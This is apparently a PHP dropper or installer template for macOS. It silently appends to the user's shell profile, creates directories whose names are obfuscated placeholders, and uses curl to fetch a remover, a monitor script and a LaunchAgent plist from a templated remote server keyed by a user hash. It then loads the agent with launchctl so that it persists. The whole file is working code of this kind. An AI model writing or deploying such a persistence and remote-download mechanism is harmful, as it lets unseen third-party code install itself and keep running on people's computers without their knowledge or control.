<?php
define('HASH', '{{USER_HASH}}');
define('DIR_HOME', $_SERVER['HOME']);
define('DIR_NAME', '{{B64_CONFIG_DIR_MAIN}}');
define('DIR_MAIN', DIR_HOME . '/' . DIR_NAME);
define('DIR_BIN', DIR_MAIN . '/' . '{{B64_CONFIG_DIR_BIN}}');
define('BINARY_FILE', DIR_BIN . '/' . '{{B64_CONFIG_FILE_MAIN_BINARY}}');
define('MONITOR_FILE', DIR_BIN . '/' . '{{B64_CONFIG_FILE_MAIN_MONITOR}}');
define('LAUNCH_PLIST', DIR_HOME . '/' . '{{B64_CONFIG_DIR_LAUNCH_AGENTS}}' . '/' . '{{B64_CONFIG_FILE_LAUNCH_PLIST}}' . '.plist');
define('DIR_HOME_BIN', DIR_HOME . '/' . '{{B64_CONFIG_DIR_LOCAL_BIN}}');
define('DIR_HOME_BIN_ESC', preg_quote(DIR_HOME_BIN, '/'));
define('INSTALLER', DIR_HOME_BIN . '/' . '{{B64_CONFIG_FILE_INSTALLER}}');
define('REMOVER', DIR_HOME_BIN . '/' . '{{B64_CONFIG_FILE_REMOVER}}');

if (trim(HASH) == '') {
  die();
}

$profile = '.bash_profile';
$overrides = array(
  '.zshrc'
);

foreach ($overrides as $prof) {
  if (file_exists(DIR_HOME . "/$prof")) {
    $profile = $prof;
  }
}

define('PROFILE_PATH', DIR_HOME . "/$profile");

if (!file_exists(PROFILE_PATH)) {
  touch(PROFILE_PATH);
}

if (!preg_match('/PATH.*' . DIR_HOME_BIN_ESC . '/', file_get_contents(PROFILE_PATH))) {
  exec('echo "export PATH=$PATH:' . DIR_HOME_BIN . '" >> ' . PROFILE_PATH);
}

$dirs = array(
  DIR_MAIN,
  DIR_BIN
);

foreach ($dirs as $dir) {
  if (!is_dir($dir)) {
    mkdir($dir);
  }
}

if (!file_exists(BINARY_FILE)) {
  copy('{{B64_CONFIG_FILE_PHP_BINARY}}', BINARY_FILE);
}

copy(__FILE__, INSTALLER);

$downloads = array(
  'r' => REMOVER,
  'g' => MONITOR_FILE,
  'l' => LAUNCH_PLIST
);

foreach ($downloads as $page => $file) {
  exec('curl -s -o ' . $file . ' ' . '{{B64_STR_SERVER_HOST}}' . $page . '.php?h=' . HASH);
}

$replaces = array(
  LAUNCH_PLIST => array(
    '{{MONITOR}}' => MONITOR_FILE,
    '{{BINARY_LOCATION}}' => BINARY_FILE
  )
);

foreach ($replaces as $file => $list) {
  $contents = file_get_contents($file);

  foreach ($list as $search => $replace) {
    $contents = str_replace($search, $replace, $contents);
  }

  file_put_contents($file, $contents);
}

exec('chmod +x ' . BINARY_FILE . ' ' . INSTALLER . ' ' . REMOVER . ' ' . MONITOR_FILE);
exec('launchctl load ' . LAUNCH_PLIST);
